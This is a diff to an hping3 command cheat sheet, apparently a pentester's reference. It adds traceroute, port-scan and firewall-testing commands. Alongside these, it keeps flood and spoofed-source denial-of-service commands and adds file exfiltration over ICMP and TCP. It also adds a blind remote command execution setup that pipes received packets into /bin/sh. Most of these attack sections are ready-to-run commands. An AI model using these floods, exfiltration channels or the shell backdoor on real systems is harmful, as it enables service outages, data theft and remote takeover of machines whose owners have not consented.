@@ -1,10 +1,15 @@
-# Note that we can encounter the following flags:
+# hping
+# Commmon flags:
+# - `-c`: number of packets to send
+# - `-1`: ICMP
+# - `-2`: UDP
+# - `-V`: Verbose
+# - `-z`: connects ctrl+z on the keyboard to increase TTL
+# - `-p`: destination port
+# - `-s`: source port
+# Note that as response we can typically encounter the following flags:
 # - SA (syn/ack), this is the response for an open port generally
 # - RA (rst/ack), this is the response for a closed port generally
-
-
-# Check firewall rules with portquiz.net
-hping3 -z -t 1 -S portquiz.net -p <whatever_port>
 
 # To use ICMP (-1 mode) ping
 hping3 -1 example.com
@@ -13,10 +18,12 @@ hping3 -1 example.com
 # triggers a remote system to respond with a list of its related subnets,
 hping -1 192.168.1.1 -C 17
 
-# To check which hosts on a LAN have ICMP disabled
+# Check if ICMP is disabled on a specific network
 hping3 -1 192.168.1.x --rand-dest -I wlan0
 
 # Traceroute with ICMP
+# If hping gets stuck on any given hop simple press ctrl-z in order to
+# skip unresponsive hop
 hping3 -1 --traceroute -V www.example.com
 
 # Traceroute with UDP
@@ -25,8 +32,17 @@ hping3 -2 4.2.2.1 -p ++44444 -T -n
 # Traceroute with TCP
 hping3 --traceroute -V -S -p 93 -s 5678 example.com
 
+# Traceroute with TCP (to check how many different paths are taken at hop 15)
+hping3 -S 1.1.1.1 -p 80 -T --ttl 15 --tr-keep-ttl -n
+
 # Traceroute with TCP and ctrl+z to increase TTL manually
 hping3 -z -t 1 -S google.com -p 80
+
+# Check firewall rules with portquiz.net
+hping3 -z -t 1 -S portquiz.net -p <whatever_port>
+
+# To check which hosts on a LAN have ICMP disabled
+hping3 -1 192.168.1.x --rand-dest -I wlan0
 
 # Port scan with SYN
 hping3 -V -S -p 93 -s 5678 example.com
@@ -54,7 +70,6 @@ hping3 -c 1 -V -p 93 -s 5678 -A dominio.xyz
 # send RST to make FIN scan ineffective
 hping -c 1 -V -p 80 -s 5050 -F example.com
 
-
 # NULL scan
 # Results:
 # - the target port is **closed** if an RST is received 
@@ -71,7 +86,6 @@ hping3 -F -P -U <ip address> -c <number of packets>
 
 # DoS Attack
 hping3 -S -P -U --flood -V --rand-source www.example.com
-
 
 # SYN Flood Attack
 hping3 -S --flood -V example.com
@@ -90,3 +104,45 @@ hping3 -A -S -P -U 66.66.66.66 -k -s 80 -p 80 -a 192.168.1.1 --flood
 
 # Ping of Death Attack
 TODO
+
+# Firewall Rule Testing
+# Let's set up the scene, let's say we are inside a network and we want
+# to understand what is firewalled, what we would ideally need is an
+# external IP which does not have any specific firewall rules on, such as
+# our trusted VPS. As an example we will show how to test if port 80 is
+# filtered, but we should do it for any port we want to test.
+# Check if port 80 is blocked
+hping3 -S <vps_ip> -c 4 -p 80
+
+# We can also use some online services such as portquiz which keeps all
+# TCP ports open for us, let's see an example:
+hping3 -S portquiz.net -c 4 -p 80
+
+# Firewalk 
+# This is an active reconnaissance network security technique that attempts
+# to determine what layer 4 protocols a given IP forwarding device will
+# pass. Firewalk works by sending out TCP or UDP packets with a TTL one
+# greater than the targeted gateway. If the gateway allows the traffic,
+# it will forward the packets to the next hop where they will expire and
+# elicit an ICMP_TIME_EXCEEDED message. If the gateway hostdoes not allow
+# the traffic, it will likely drop the packets on the floor and we will
+# see no response. (Also in this case we may use portquiz.net)
+hping3 -z -t 1 -S <vps_ip> -p 80
+
+# Transfer a File via ICMP (Data Exfiltration)
+On Receiver:
+hping 192.168.10.66 --listen signature  --safe --icmp
+On Sender:
+hping 192.168.10.44 --icmp -d 100 --sign signature --file /path/to/file.txt
+
+# Transfer a File via TCP (Data Exfiltration)
+On Receiver:
+hping 192.168.10.66  --listen signature --safe -p 22
+On Sender:
+hping -p 22 -d 100 --sign signature --file /path/to/file.txt
+
+# hping blind command execution via TCP dstport 0 (trigger commands on remote machine)
+On Target:
+hping3 -I wlan0 -9 secret | /bin/sh
+On Attacker (Local machine):
+hping3 -R 192.168.1.100 -e secret -E <commands_file> -d 101 -c 1
